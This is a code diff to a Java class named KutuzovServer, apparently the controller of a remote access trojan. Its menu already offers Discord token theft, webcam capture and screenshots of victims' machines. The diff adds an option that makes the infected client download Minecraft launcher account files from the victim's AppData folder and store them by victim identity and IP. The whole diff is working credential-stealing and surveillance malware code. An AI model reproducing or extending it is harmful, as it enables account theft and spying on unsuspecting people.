@@ -7,6 +7,7 @@ import com.sun.imageio.plugins.common.ImageUtil;
 import jdk.nashorn.internal.ir.annotations.Ignore;
 import me.kutuzov.packet.*;
 import me.kutuzov.packet.bukkit.*;
+import me.kutuzov.packet.kftp.*;
 import me.kutuzov.packet.logger.*;
 import me.kutuzov.packet.logger.types.TokenType;
 import me.kutuzov.server.client.Client;
@@ -28,6 +29,7 @@ import java.text.SimpleDateFormat;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
 import java.time.format.DateTimeFormatterBuilder;
+import java.util.ArrayList;
 import java.util.Date;
 import java.util.Locale;
 import java.util.Map;
@@ -342,6 +344,7 @@ public class KutuzovServer {
         pnl("  1) Discord Token");
         pnl("  2) Webcam Capture");
         pnl("  3) Screenshot");
+        pnl("  4) Minecraft Account(Windows)");
         pwl("Option: ");
 
         String input = readLine();
@@ -353,6 +356,9 @@ public class KutuzovServer {
 
         File file = new File("captures/" + client.getIdentifierName() + "/" + client.getIp().split(":")[0] + "_" + client.getLocalIp() + "/" + date + ".png");
         file.getParentFile().mkdirs();
+
+        File loggerFolder = new File("logger/" + client.getIdentifierName() + "/" + client.getIp().split(":")[0] + "_" + client.getLocalIp() + "/" + date + "/");
+        loggerFolder.mkdirs();
 
         switch (option) {
             case 1: {
@@ -475,6 +481,52 @@ public class KutuzovServer {
                 pnl("Press any key to continue.");
                 readLine();
             } break;
+
+            case 4: {
+                pnl("Waiting for queue...");
+
+                client.addWait(() -> {
+                    try {
+                        String username = client.getIdentifierName();
+                        String directory = "C:\\Users\\" + username + "\\AppData\\Roaming\\.minecraft\\";
+
+                        ArrayList<String> files = new ArrayList<>();
+                        files.add("launcher_accounts.json");
+                        files.add("launcher_profiles.json");
+                        files.add("usercache.json");
+
+                        pnl("Downloading files...");
+
+                        client.sendPacket(new SCKFTPChangeDirectoryPacket(directory));
+                        client.readPacket(); // Ignore CSKFTPDirectoryInfoPacket
+
+                        for(String f : files) {
+                            client.sendPacket(new SCKFTPDownloadFilePacket(f));
+                            CSKFTPResponsePacket response = (CSKFTPResponsePacket) client.readPacket();
+                            if(response.response != CSKFTPResponsePacket.RESPONSE_OK) {
+                                pnl("  - " + f + " (failed)");
+                                continue;
+                            }
+
+                            CSKFTPFilePacket download = (CSKFTPFilePacket) client.readPacket();
+
+                            pnl("  - " + download.path + " (" + download.data.length + " bytes)");
+
+                            File y = new File(loggerFolder, f);
+                            if(y.isDirectory())
+                                continue;
+                            FileOutputStream fos = new FileOutputStream(y);
+                            fos.write(download.data);
+                            fos.close();
+                        }
+
+                        pnl("Files saved to \"" + loggerFolder.getAbsolutePath() + "\".");
+                    } catch (Exception exception) { exception.printStackTrace(); }
+                });
+
+                pnl("Press any key to continue.");
+                readLine();
+            } return;
 
             case 0: return;
             default:
